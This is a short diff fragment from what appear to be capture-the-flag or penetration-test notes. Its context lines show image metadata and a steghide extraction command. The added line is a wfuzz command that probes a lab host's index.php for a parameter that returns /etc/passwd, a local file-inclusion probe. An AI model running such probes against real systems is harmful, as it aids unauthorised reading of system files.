@@ -1596,3 +1596,19 @@ Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 ```bash 
 steghide extract -sf img.jpg
 ```
+
+
+
+
+
+
+wfuzz -u http://192.168.56.21/index.php -d 'FUZZ=/etc/passwd' -w /opt/zd/wfuzz.txt --hh  19
+
+
+
+
+
+
+
+
+
